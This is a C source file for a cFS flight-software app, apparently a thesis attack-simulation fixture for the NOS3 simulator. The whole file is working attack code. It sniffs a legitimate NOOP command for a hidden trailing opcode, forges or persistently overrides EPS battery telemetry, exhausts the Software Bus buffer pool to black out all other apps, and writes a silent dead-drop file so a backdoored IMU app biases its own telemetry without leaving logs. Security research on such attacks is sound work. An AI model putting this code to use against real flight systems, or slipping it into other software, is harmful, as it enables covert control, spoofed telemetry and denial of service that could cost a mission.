/*
 * ============================================================================
 * NOISY_APP - covert-opcode "piggyback" research fixture
 * ============================================================================
 *
 * Base skeleton: an empty no-op cFS app that registers with EVS, creates a
 * command pipe, subscribes to its command MID, and blocks idle on the pipe
 * (ported from the DTU RTEMS NOS3 repo).
 *
 * Research addition (thesis PoC): the app ALSO subscribes to a legitimate,
 * benign carrier command MID (CI_LAB NOOP by default) and sniffs it off the
 * Software Bus. cFE SB delivers every message to ALL subscribers and performs
 * no sender authentication, so a co-resident app can observe traffic addressed
 * to another app. When a carrier NOOP arrives that is LONGER than a normal
 * (header-only) NOOP, the trailing byte is read as a covert opcode and a
 * scenario is dispatched. Normal-length carrier commands are ignored, so
 * legitimate operations are unaffected.
 *
 * Note that the legitimate carrier app (CI_LAB) calls CFE_MSG_VerifyCmdLength
 * and REJECTS the over-length NOOP (emitting a length-error event and bumping
 * its CommandErrorCounter). That endpoint defense does not stop this sniffer:
 * the byte is read off the bus independently of the endpoint's check.
 *
 * This app is an intentional attack-simulation fixture. It is OFF by default
 * (see targets.cmake / cpu1_cfe_es_startup.scr) and must be explicitly enabled.
 *
 * ----------------------------------------------------------------------------
 * CONFIGURATION MAP (where to change things)
 * ----------------------------------------------------------------------------
 *
 * MESSAGE IDs (MIDs):
 *   Defined in  fsw/platform_inc/noisy_app_msgids.h
 *     NOISY_APP_CMD_MID      command input  (subscribed to below)
 *     NOISY_APP_SEND_HK_MID  housekeeping request (for a future SCH wakeup)
 *     NOISY_APP_HK_TLM_MID   housekeeping telemetry (for a future TO downlink)
 *
 * CARRIER COMMAND (the sniffed "piggyback" channel):
 *   CARRIER_CMD_MID / CARRIER_NOOP_FC below. Default is CI_LAB's NOOP
 *   (CI_LAB_CMD_MID 0x18E0, CI_LAB_NOOP_CC 0). Change CARRIER_CMD_MID to
 *   re-point the sniffer at a different active command stream (e.g. TO_LAB
 *   0x18E8). A normal NOOP is header-only, so any extra trailing byte is the
 *   covert opcode.
 *
 * COVERT OPCODES (the trailing byte -> scenario map): see the switch in
 *   NOISY_APP_RunScenario() below.
 *
 * ENABLE / DISABLE IN THE BUILD:
 *   cfg/nos3_defs/targets.cmake -> MISSION_GLOBAL_APPLIST (listed = compiled).
 * ENABLE / DISABLE AT STARTUP (and PRIORITY / STACK):
 *   cfg/nos3_defs/cpu1_cfe_es_startup.scr -> the "noisy_app" row
 *   (col 1: CFE_APP = loaded, OFF_APP = present but not loaded; keep low
 *   priority so the fixture never competes with core apps).
 *
 * NOTE: `make config` regenerates the cfg/build/... copies from these
 * cfg/nos3_defs/ sources. Edit the sources, not the copies.
 * ============================================================================
 */

#include "cfe.h"
#include "cfe_sb.h"
#include "cfe_es.h"
#include "cfe_evs.h"
#include <string.h>

#include "noisy_app_msgids.h"
#include "generic_eps_msgids.h" /* GENERIC_EPS_HK_TLM_MID (0x091A) - EPS_SPOOF target */

/* ---- Carrier (sniffed legitimate command) ------------------------------- */
#define CARRIER_CMD_MID   0x18E0 /* CI_LAB_CMD_MID (fsw/apps/ci_lab/.../ci_lab_msgids.h) */
#define CARRIER_NOOP_FC   0      /* CI_LAB_NOOP_CC: a normal NOOP is header-only       */

/* ---- Covert opcodes (the piggybacked trailing byte) --------------------- */
#define OPCODE_DORMANT      0x00 /* do nothing; also CLEARS a running override */
#define OPCODE_EPS_SPOOF    0x02 /* forge ONE low-battery EPS HK packet        */
#define OPCODE_SB_BURST     0x04 /* emit a bounded Software Bus burst          */
#define OPCODE_EPS_OVERRIDE 0x06 /* PERSISTENT: shadow every real EPS HK       */
#define OPCODE_SB_FLOOD     0x08 /* DESTRUCTIVE: lock the whole SB buffer pool */
#define OPCODE_IMU_BIAS     0x0A /* COVERT CHANNEL: drop an IMU bias spec file  */

/* ---- Scenario tuning ---------------------------------------------------- */
#define SPOOF_BATTERY_MV  10000  /* < LC WP0 threshold (14800 mV) -> SAFE RTS */
#define SB_BURST_COUNT    64     /* HARD CAP - not the legacy 32k storm       */
#define SB_BURST_YIELD    8      /* OS_TaskDelay(1) every N packets to yield  */

/* OPCODE_EPS_OVERRIDE: value written into every shadow packet. 10000 forces
 * SAFE (drive WP0); set >= 14800 (e.g. 25000) to MASK a real low battery so
 * the protective SAFE never fires. See docs/security/noisy_app-escalation-design.md. */
#define OVERRIDE_BATTERY_MV 10000

/* OPCODE_SB_FLOOD: self-hosted pool lock. ~15 max-size (32 KB) packets parked
 * unread in our own pipe exhaust the 512 KB CFE_PLATFORM_SB_BUF_MEMORY_BYTES
 * arena, after which every other app's CFE_SB_TransmitMsg fails. DESTRUCTIVE:
 * needs a sim restart. Gated behind an explicit piggyback opcode only. */
#define LOCK_MID          NOISY_APP_HK_TLM_MID  /* a MID we own and never drain */
#define LOCK_PIPE_DEPTH   128
#define LOCK_MSGLIM       64     /* >> ~15, so all our parked buffers are kept */

/* ---- OPCODE_IMU_BIAS: covert inter-app channel (file dead-drop) ---------- *
 * Instead of touching the Software Bus, write a small "calibration" spec to a
 * file on the volatile RAM disk. A second backdoored app (the generic_imu FSW
 * app) polls for this file each telemetry cycle, latches the spec, and applies
 * a slow-drift bias to its own IMU axis telemetry. The channel is the FILE -
 * cFS SB delivery is never used, so cfs_god_view.json and EVS never see it.
 * Both sides agree on this layout out-of-band (mirrored, not a shared build
 * artifact - same approach as NOISY_EpsHkMimic_t above). Keep in sync with
 * IMU_CovertDrop_t in components/generic_imu/fsw/cfs/src/generic_imu_app.c. */
#define IMU_DROP_PATH        "/ram/.imu_cal"   /* dotfile: looks like cal data  */
#define IMU_DROP_MAGIC       0x494D5542u       /* 'IMUB'                        */
#define IMU_BIAS_AXIS_MASK   0x07              /* X|Y|Z                         */
#define IMU_BIAS_PROFILE     1                 /* 1 = slow drift, 0 = constant  */
#define IMU_BIAS_FLAGS       0x01              /* consume (remove) file on latch*/
#define IMU_BIAS_GYRO_STEP   0.0010f           /* angular bias added per cycle  */
#define IMU_BIAS_ACCEL_STEP  0.0f              /* linear bias added per cycle   */
#define IMU_BIAS_GYRO_CAP    0.10f             /* angular bias clamp            */
#define IMU_BIAS_ACCEL_CAP   0.0f              /* linear bias clamp (0 = none)  */

typedef struct
{
    uint32 magic;
    uint8  version;
    uint8  axis_mask;
    uint8  profile;
    uint8  flags;
    float  gyro_step;
    float  accel_step;
    float  gyro_cap;
    float  accel_cap;
} __attribute__((packed)) NOISY_ImuDrop_t;

/* ---- EVS event IDs ------------------------------------------------------ */
#define NOISY_EVT_INIT      1
#define NOISY_EVT_PIGGYBACK 2
#define NOISY_EVT_EPS_SPOOF 3
#define NOISY_EVT_SB_BURST  4
#define NOISY_EVT_UNKNOWN   5
#define NOISY_EVT_OVERRIDE  6
#define NOISY_EVT_POOLLOCK  7

/*
 * Self-contained mirror of the EPS HK wire layout (the attacker hardcodes the
 * victim telemetry format rather than linking the victim's struct). Only
 * BatteryVoltage matters for tripping LC watchpoint WP0 (wire offset 16).
 */
typedef struct
{
    CFE_MSG_TelemetryHeader_t TlmHeader;
    uint8  CommandErrorCount;
    uint8  CommandCount;
    uint8  DeviceErrorCount;
    uint8  DeviceCount;
    uint16 BatteryVoltage;       /* offset 16 on the wire */
    uint16 BatteryTemperature;
    uint16 Bus3p3Voltage;
    uint16 Bus5p0Voltage;
    uint16 Bus12Voltage;
    uint16 EPSTemperature;
    uint16 SolarArrayVoltage;
    uint16 SolarArrayTemperature;
    struct { uint16 Voltage; uint16 Current; uint16 Status; } Switch[8];
} __attribute__((packed)) NOISY_EpsHkMimic_t;

static uint32 NOISY_TriggerCount = 0;
static bool   NOISY_OverrideOn   = false;  /* OPCODE_EPS_OVERRIDE engaged?   */

/* Forge and transmit ONE EPS housekeeping packet with a chosen battery value.
 * Consumers (LC, ELK) see it as a normal GENERIC_EPS_HK_TLM. Silent: the caller
 * decides whether to emit an EVS event (so the per-packet override does not
 * flood EVS at the EPS HK rate). */
static void NOISY_SendEpsHk(uint16 battery_mv)
{
    NOISY_EpsHkMimic_t pkt;

    memset(&pkt, 0, sizeof(pkt));
    CFE_MSG_Init(CFE_MSG_PTR(pkt.TlmHeader),
                 CFE_SB_ValueToMsgId(GENERIC_EPS_HK_TLM_MID), sizeof(pkt));

    pkt.DeviceCount    = 1;
    pkt.BatteryVoltage = battery_mv;

    CFE_SB_TimeStampMsg(CFE_MSG_PTR(pkt.TlmHeader));
    CFE_SB_TransmitMsg(CFE_MSG_PTR(pkt.TlmHeader), true);
}

/* One-shot spoof (OPCODE_EPS_SPOOF): forge a single low-battery packet and log. */
static void NOISY_SpoofEpsHk(void)
{
    NOISY_SendEpsHk(SPOOF_BATTERY_MV);
    CFE_EVS_SendEvent(NOISY_EVT_EPS_SPOOF, CFE_EVS_EventType_INFORMATION,
                      "NOISY_APP: EPS HK SPOOF sent on 0x%04X (BatteryVoltage=%u mV).",
                      (unsigned int)GENERIC_EPS_HK_TLM_MID, (unsigned int)SPOOF_BATTERY_MV);
}

/* Emit a small, HARD-CAPPED Software Bus burst to demonstrate pool/pipe stress
 * without the legacy storm. Yields periodically so the sim stays responsive. */
static void NOISY_SbBurst(void)
{
    CFE_MSG_CommandHeader_t spam;
    int i;

    memset(&spam, 0, sizeof(spam));
    CFE_MSG_Init(CFE_MSG_PTR(spam), CFE_SB_ValueToMsgId(NOISY_APP_HK_TLM_MID),
                 sizeof(spam));

    for (i = 0; i < SB_BURST_COUNT; i++)
    {
        CFE_SB_TransmitMsg(CFE_MSG_PTR(spam), true);
        if ((i % SB_BURST_YIELD) == (SB_BURST_YIELD - 1))
        {
            OS_TaskDelay(1);
        }
    }

    CFE_EVS_SendEvent(NOISY_EVT_SB_BURST, CFE_EVS_EventType_INFORMATION,
                      "NOISY_APP: SB BURST sent %d packets on 0x%04X (capped).",
                      SB_BURST_COUNT, (unsigned int)NOISY_APP_HK_TLM_MID);
}

/* A maximum-size SB message; the bigger the packet, the fewer needed to drain
 * the shared 512 KB pool. */
typedef struct
{
    CFE_MSG_TelemetryHeader_t Hdr;
    uint8 Pad[CFE_MISSION_SB_MAX_SB_MSG_SIZE - sizeof(CFE_MSG_TelemetryHeader_t)];
} NOISY_MaxPkt_t;

/* OPCODE_SB_FLOOD - self-hosted Software Bus pool lock (DESTRUCTIVE).
 *
 * Park ~15 max-size buffers UNREAD in our own pipe to exhaust the single shared
 * CFE_PLATFORM_SB_BUF_MEMORY_BYTES (512 KB) arena. After that every other app's
 * CFE_SB_TransmitMsg fails with CFE_SB_BUF_ALOC_ERR: HK, telemetry, CI_LAB
 * uplink-forwarding and LC all stall - a silent, total Software Bus blackout.
 * The buffers stay parked because we never CFE_SB_ReceiveBuffer the sink pipe,
 * so no busy-spin is required once the pool is dry. This needs a sim restart.
 * It only runs on an explicit piggyback OPCODE_SB_FLOOD (0x08). */
static void NOISY_SbPoolLock(void)
{
    static NOISY_MaxPkt_t big;       /* 32 KB: keep it off the task stack */
    CFE_SB_PipeId_t sink = CFE_SB_INVALID_PIPE;
    int parked = 0;
    int i;

    /* A deep pipe we deliberately never drain, with a high per-MID limit so our
     * own buffers pile up instead of being MSGID_LIM-dropped. */
    if (CFE_SB_CreatePipe(&sink, LOCK_PIPE_DEPTH, "NOISY_SINK") != CFE_SUCCESS)
    {
        return;
    }
    CFE_SB_SubscribeEx(CFE_SB_ValueToMsgId(LOCK_MID), sink,
                       CFE_SB_DEFAULT_QOS, LOCK_MSGLIM);

    /* Emit the warning BEFORE the pool is gone (EVS itself rides the bus). */
    CFE_EVS_SendEvent(NOISY_EVT_POOLLOCK, CFE_EVS_EventType_CRITICAL,
                      "NOISY_APP: SB POOL LOCK engaged (DoS, research mode).");

    memset(&big, 0, sizeof(big));
    CFE_MSG_Init(CFE_MSG_PTR(big.Hdr), CFE_SB_ValueToMsgId(LOCK_MID), sizeof(big));

    for (i = 0; i < LOCK_MSGLIM; i++)
    {
        CFE_SB_TimeStampMsg(CFE_MSG_PTR(big.Hdr));
        if (CFE_SB_TransmitMsg(CFE_MSG_PTR(big.Hdr), true) != CFE_SUCCESS)
        {
            break;   /* pool is now dry: the lock is held by the parked buffers */
        }
        parked++;
    }

    /* Returns with the pool empty; parked buffers keep it that way with no
     * further CPU use. (sink is intentionally leaked - the lock IS the point.) */
}

/* OPCODE_IMU_BIAS - write the covert IMU bias dead-drop file (the channel).
 * Deliberately emits NO EVS event: the inter-app channel and its effect must
 * be silent. The only artifact is a short-lived file on /ram, which the ELK
 * pipeline does not index. The backdoored generic_imu app latches it and then
 * removes it (transient evidence), so the IMU drift has no on-bus cause. */
static void NOISY_WriteImuDeadDrop(void)
{
    osal_id_t       fd = OS_OBJECT_ID_UNDEFINED;
    NOISY_ImuDrop_t drop;

    memset(&drop, 0, sizeof(drop));
    drop.magic      = IMU_DROP_MAGIC;
    drop.version    = 1;
    drop.axis_mask  = IMU_BIAS_AXIS_MASK;
    drop.profile    = IMU_BIAS_PROFILE;
    drop.flags      = IMU_BIAS_FLAGS;
    drop.gyro_step  = IMU_BIAS_GYRO_STEP;
    drop.accel_step = IMU_BIAS_ACCEL_STEP;
    drop.gyro_cap   = IMU_BIAS_GYRO_CAP;
    drop.accel_cap  = IMU_BIAS_ACCEL_CAP;

    if (OS_OpenCreate(&fd, IMU_DROP_PATH, OS_FILE_FLAG_CREATE | OS_FILE_FLAG_TRUNCATE, OS_WRITE_ONLY) == OS_SUCCESS)
    {
        OS_write(fd, &drop, sizeof(drop));
        OS_close(fd);
    }
}

/* Dispatch on the covert opcode byte. */
static void NOISY_APP_RunScenario(uint8 opcode)
{
    switch (opcode)
    {
        case OPCODE_DORMANT:
            /* stealth: act on nothing; also stop a running EPS override. */
            if (NOISY_OverrideOn)
            {
                NOISY_OverrideOn = false;
                CFE_EVS_SendEvent(NOISY_EVT_OVERRIDE, CFE_EVS_EventType_INFORMATION,
                                  "NOISY_APP: EPS override CLEARED.");
            }
            break;

        case OPCODE_EPS_SPOOF:
            NOISY_SpoofEpsHk();
            break;

        case OPCODE_SB_BURST:
            NOISY_SbBurst();
            break;

        case OPCODE_EPS_OVERRIDE:
            /* Persistent: shadow every genuine EPS HK from now on (handled in
             * the main loop). One EVS event here; not one per shadow. */
            NOISY_OverrideOn = true;
            CFE_EVS_SendEvent(NOISY_EVT_OVERRIDE, CFE_EVS_EventType_INFORMATION,
                              "NOISY_APP: EPS override ENGAGED (battery=%u mV). "
                              "Send opcode 0x00 to clear.",
                              (unsigned int)OVERRIDE_BATTERY_MV);
            break;

        case OPCODE_SB_FLOOD:
            NOISY_SbPoolLock();   /* DESTRUCTIVE: locks the SB pool */
            break;

        case OPCODE_IMU_BIAS:
            /* Covert channel: silent file write (no EVS). The backdoored IMU
             * app picks it up off /ram and biases its own telemetry. */
            NOISY_WriteImuDeadDrop();
            break;

        default:
            CFE_EVS_SendEvent(NOISY_EVT_UNKNOWN, CFE_EVS_EventType_INFORMATION,
                              "NOISY_APP: unknown opcode 0x%02X (ignored).",
                              (unsigned int)opcode);
            break;
    }
}

void NOISY_APP_Main(void)
{
    uint32           RunStatus = CFE_ES_RunStatus_APP_RUN;
    CFE_SB_PipeId_t  CmdPipe;
    CFE_SB_Buffer_t *BufPtr;

    CFE_EVS_Register(NULL, 0, CFE_EVS_EventFilter_BINARY);
    CFE_ES_WaitForStartupSync(10000);

    CFE_SB_CreatePipe(&CmdPipe, 10, "NOISY_CMD_PIPE");
    /* Own command MID (direct path) + the sniffed legitimate carrier. */
    CFE_SB_Subscribe(CFE_SB_ValueToMsgId(NOISY_APP_CMD_MID), CmdPipe);
    CFE_SB_Subscribe(CFE_SB_ValueToMsgId(CARRIER_CMD_MID), CmdPipe);
    /* Also observe genuine EPS HK so OPCODE_EPS_OVERRIDE can shadow each packet
     * (this subscription is itself an IOC: a co-resident app reading EPS TLM). */
    CFE_SB_Subscribe(CFE_SB_ValueToMsgId(GENERIC_EPS_HK_TLM_MID), CmdPipe);

    CFE_EVS_SendEvent(NOISY_EVT_INIT, CFE_EVS_EventType_INFORMATION,
                      "NOISY_APP: Initialized. CMD MID 0x%04X, sniffing carrier 0x%04X.",
                      (unsigned int)NOISY_APP_CMD_MID, (unsigned int)CARRIER_CMD_MID);

    while (CFE_ES_RunLoop(&RunStatus) == true)
    {
        if (CFE_SB_ReceiveBuffer(&BufPtr, CmdPipe, CFE_SB_PEND_FOREVER) != CFE_SUCCESS)
        {
            continue;
        }

        CFE_SB_MsgId_t    MsgId   = CFE_SB_INVALID_MSG_ID;
        CFE_MSG_FcnCode_t FcnCode = 0;
        size_t            Size    = 0;

        CFE_MSG_GetMsgId(&BufPtr->Msg, &MsgId);
        CFE_MSG_GetFcnCode(&BufPtr->Msg, &FcnCode);
        CFE_MSG_GetSize(&BufPtr->Msg, &Size);

        /*
         * Reactive EPS override (OPCODE_EPS_OVERRIDE): every time a GENUINE EPS
         * HK arrives, immediately emit a shadow with our chosen battery value.
         * Because SB delivery is last-writer-wins for any later sampler (LC's
         * actionpoint sample, COSMOS, DS), the shadow that follows each genuine
         * packet is the value they act on - so the spoof wins regardless of the
         * real publish rate. The BatteryVoltage guard stops us reacting to our
         * own shadow (we are subscribed to 0x091A too), which would loop.
         */
        if (NOISY_OverrideOn &&
            CFE_SB_MsgIdToValue(MsgId) == GENERIC_EPS_HK_TLM_MID)
        {
            const NOISY_EpsHkMimic_t *in = (const NOISY_EpsHkMimic_t *)BufPtr;
            if (in->BatteryVoltage != OVERRIDE_BATTERY_MV)
            {
                NOISY_SendEpsHk(OVERRIDE_BATTERY_MV);
            }
            continue;
        }

        /*
         * Piggyback detection: a NOOP on the carrier MID that is longer than a
         * normal header-only NOOP carries a covert opcode in its trailing byte.
         * The same logic accepts a trailing byte on this app's own CMD MID, so
         * the scenario can also be driven directly for testing.
         */
        bool is_carrier_noop = (CFE_SB_MsgIdToValue(MsgId) == CARRIER_CMD_MID) &&
                               (FcnCode == CARRIER_NOOP_FC);
        bool is_own_cmd      = (CFE_SB_MsgIdToValue(MsgId) == NOISY_APP_CMD_MID);

        if ((is_carrier_noop || is_own_cmd) && (Size > sizeof(CFE_MSG_CommandHeader_t)))
        {
            uint8 opcode = ((const uint8 *)BufPtr)[Size - 1];

            NOISY_TriggerCount++;
            CFE_EVS_SendEvent(NOISY_EVT_PIGGYBACK, CFE_EVS_EventType_INFORMATION,
                              "NOISY_APP: piggyback opcode 0x%02X on MID 0x%04X "
                              "(len %u, count %u).",
                              (unsigned int)opcode,
                              (unsigned int)CFE_SB_MsgIdToValue(MsgId),
                              (unsigned int)Size, (unsigned int)NOISY_TriggerCount);

            NOISY_APP_RunScenario(opcode);
        }
        /* Normal-length carrier traffic: ignore (legitimate ops untouched). */
    }

    CFE_ES_ExitApp(RunStatus);
}
